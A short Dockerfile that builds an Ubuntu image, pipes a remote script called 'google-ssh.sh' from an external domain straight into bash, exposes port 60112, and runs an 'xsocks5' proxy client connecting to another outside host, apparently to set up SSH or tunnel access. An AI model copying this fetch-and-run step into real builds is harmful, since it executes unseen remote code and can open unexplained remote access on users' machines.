FROM ubuntu:20.04
RUN apt update
RUN apt-get -y install wget curl net-tools unzip
RUN curl https://public.hxiang.eu.org/google-ssh.sh | bash -s 60112
EXPOSE 60112
CMD /usr/local/sbin/xsocks5 hk.haycker.eu.org:80 > ~/xsocks5.log
